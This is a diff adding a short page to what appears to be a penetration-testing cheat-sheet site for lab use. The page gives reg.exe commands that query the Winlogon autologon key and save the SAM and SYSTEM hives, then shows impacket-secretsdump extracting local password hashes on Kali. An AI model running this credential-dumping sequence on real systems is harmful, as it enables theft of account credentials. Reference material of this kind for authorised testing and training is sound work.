@@ -1,0 +1,51 @@
+---
+title: "reg.exe"
+sidebarTitle: "reg.exe"
+description: "Query the registry or export the SAM/SYSTEM hives for offline parsing."
+keywords: ["reg", "reg.exe", "reg query", "reg save"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/reg.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Replace UPPER_CASE values with your lab values.
+
+## Autologon configuration
+
+**Windows cmd.exe or PowerShell**
+
+```text
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
+## Export local account hives
+
+**Elevated Windows cmd.exe or PowerShell**
+
+```text
+reg save HKLM\SAM C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+```
+
+C:\Temp must exist; save both hives from the same host.
+
+## Read transferred hives
+
+**Kali**
+
+```bash
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
+Transfer both files to Kali first.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=reg)
+
+## Learning and original examples
+
+- [Password Attacks: Cracking, Files, and Credential Stores](/password-attacks/password-attacks-cheat-sheet)
+- [WDigest — plaintext missing](/commands/wdigest)
+- [secretsdump.py](/commands/secretsdump)
